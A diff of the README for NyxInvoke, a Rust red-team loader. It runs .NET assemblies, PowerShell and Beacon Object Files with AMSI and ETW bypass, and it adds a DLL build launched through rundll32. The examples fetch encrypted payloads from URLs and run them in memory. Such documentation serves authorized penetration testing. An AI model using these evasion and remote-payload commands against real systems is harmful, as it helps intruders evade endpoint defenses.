@@ -1,6 +1,6 @@
 # NyxInvoke
 
-NyxInvoke is a rust based command-line tool designed for executing .NET assemblies, PowerShell commands/scripts, and Beacon Object Files (BOFs) with built-in patchless AMSI and ETW bypass capabilities.
+NyxInvoke is a versatile Rust-based tool designed for executing .NET assemblies, PowerShell commands/scripts, and Beacon Object Files (BOFs) with built-in patchless AMSI and ETW bypass capabilities. It can be compiled as either a standalone executable or a DLL.
 
 ## Features
 
@@ -11,16 +11,45 @@ NyxInvoke is a rust based command-line tool designed for executing .NET assembli
 - Built-in patchless ETW (Event Tracing for Windows) bypass
 - Support for encrypted payloads with AES decryption
 - Flexible input options: local files, URLs, or compiled-in data
+- Dual-build support: can be compiled as an executable or a DLL
+
+## Building
+
+NyxInvoke can be built as either an executable or a DLL. Use the following commands:
+
+### Executable
+
+```
+cargo build --release --features exe
+```
+
+### DLL
+
+```
+cargo build --release --features dll
+```
+
+To include compiled-in CLR or BOF data, add the respective features:
+
+```
+cargo build --release --features "exe,compiled_clr,compiled_bof"
+```
+or
+```
+cargo build --release --features "dll,compiled_clr,compiled_bof"
+```
 
 ## Usage
 
-NyxInvoke supports three main modes of operation:
+### Executable Mode
+
+The executable supports three main modes of operation:
 
 1. CLR Mode (.NET assembly execution)
 2. PowerShell Mode
 3. BOF Mode (Beacon Object File execution)
 
-### General Syntax
+#### General Syntax
 
 ```
 NyxInvoke.exe <mode> [OPTIONS]
@@ -28,13 +57,21 @@ NyxInvoke.exe <mode> [OPTIONS]
 
 Where `<mode>` is one of: `clr`, `ps`, or `bof`.
 
+### DLL Mode
+
+When compiled as a DLL, NyxInvoke can be executed using rundll32. The syntax is:
+
+```
+rundll32.exe NyxInvoke.dll,NyxInvoke <mode> [OPTIONS]
+```
+
 ### Mode-Specific Options
 
 1. CLR Mode:
 ```text
 Execute a .NET assembly
 
-Usage: NyxInvoke.exe clr [OPTIONS]
+Usage: NyxInvoke.exe clr [OPTIONS] (or rundll32.exe NyxInvoke.dll,NyxInvoke clr [OPTIONS])
 
 Options:
       --args <ARGS>                          Arguments for the executable
@@ -44,23 +81,24 @@ Options:
       --assembly <ASSEMBLY_FILENAME_OR_URL>  Assembly filename or URL
   -h, --help                                 Print help
 ```
+
 2. PowerShell Mode:
 ```text
 Execute a PowerShell command or script
 
-Usage: NyxInvoke.exe ps [OPTIONS]
+Usage: NyxInvoke.exe ps [OPTIONS] (or rundll32.exe NyxInvoke.dll,NyxInvoke ps [OPTIONS])
 
 Options:
       --command <COMMAND>  PowerShell command to execute
       --script <SCRIPT>    Path to a PowerShell script to execute
-  -h, --help               Print help                                Print help
+  -h, --help               Print help
 ```
 
 3. BOF Mode:
 ```text
 Execute a Beacon Object File (BOF)
 
-Usage: NyxInvoke.exe bof [OPTIONS]
+Usage: NyxInvoke.exe bof [OPTIONS] (or rundll32.exe NyxInvoke.dll,NyxInvoke bof [OPTIONS])
 
 Options:
       --args <ARGS>...             Arguments for the BOF
@@ -68,56 +106,45 @@ Options:
       --key <KEY_FILENAME_OR_URL>  Key filename or URL
       --iv <IV_FILENAME_OR_URL>    IV filename or URL
       --bof <BOF_FILENAME_OR_URL>  BOF filename or URL
-  -h, --help                       Print help                                Print help
+  -h, --help                       Print help
 ```
 
 ## Examples
 
-### CLR Mode
+### Executable Mode
 
-1. Remote Execution:
+1. CLR Mode (Remote Execution):
    ```
    NyxInvoke.exe clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
    ```
 
-2. Local Execution:
-   ```
-   NyxInvoke.exe clr --key C:\path\to\clr_aes.key --iv C:\path\to\clr_aes.iv --assembly C:\path\to\clr_data.enc --args arg1 arg2
-   ```
-
-3. Compiled Execution:
-   ```
-   NyxInvoke.exe clr --args arg1 arg2
-   ```
-
-### PowerShell Mode
-
-1. Script Execution:
+2. PowerShell Mode (Script Execution):
    ```
    NyxInvoke.exe ps --script C:\path\to\script.ps1
    ```
 
-2. Direct Command Execution:
-   ```
-   NyxInvoke.exe ps --command "Get-Process | Select-Object Name, ID"
-   ```
-
-### BOF Mode
-
-1. Remote Execution:
-   ```
-   NyxInvoke.exe bof --base https://example.com/resources --key bof_aes.key --iv bof_aes.iv --bof bof_data.enc --args "str=argument1" "int=42"
-   ```
-
-2. Local Execution:
+3. BOF Mode (Local Execution):
    ```
    NyxInvoke.exe bof --key C:\path\to\bof_aes.key --iv C:\path\to\bof_aes.iv --bof C:\path\to\bof_data.enc --args "str=argument1" "int=42"
    ```
 
-3. Compiled Execution:
+### DLL Mode
+
+1. CLR Mode (Remote Execution):
    ```
-   NyxInvoke.exe bof --args "str=argument1" "int=42"
+   rundll32.exe NyxInvoke.dll,NyxInvoke clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
    ```
+
+2. PowerShell Mode (Direct Command Execution):
+   ```
+   rundll32.exe NyxInvoke.dll,NyxInvoke ps --command "Get-Process | Select-Object Name, ID"
+   ```
+
+3. BOF Mode (Compiled Execution):
+   ```
+   rundll32.exe NyxInvoke.dll,NyxInvoke bof --args "str=argument1" "int=42"
+   ```
+
 
 ## Test Resources
 
@@ -138,19 +165,6 @@ In the `resources` directory, you'll find several files to test NyxInvoke's func
      ```
      NyxInvoke.exe bof --key resources/bof_aes.key --iv resources/bof_aes.iv --bof resources/bof_data.enc --args "wstr=C:\Windows\system32\cmd.exe"
      ```
-
-
-## Building
-
-To build NyxInvoke
-
-```
-cargo +nightly build --release --target=x86_64-pc-windows-msvc
-```
-or with compiled-in CLR or BOF data
-```
-cargo +nightly build --release --features=compiled_bof,compiled_clr
-```
 
 ## Screenshot
 
@@ -182,11 +196,13 @@ cargo +nightly build --release --features=compiled_bof,compiled_clr
 ![Screenshot 2024-09-17 172028](https://github.com/user-attachments/assets/d055cb24-c8f0-4df7-b358-12a061f33c50)
 
 
-## Creadits
-- @yamakadi for the [clroxide](https://github.com/yamakadi/clroxide) project
-- @hakaioffsec for the [coffe](https://github.com/hakaioffsec/coffee) project
+
 
 ## Legal Notice
 
 This tool is for educational and authorized testing purposes only. Ensure you have proper permissions before use in any environment.
 
+## Credits
+
+- @yamakadi for the [clroxide](https://github.com/yamakadi/clroxide) project
+- @hakaioffsec for the [coffee](https://github.com/hakaioffsec/coffee) project
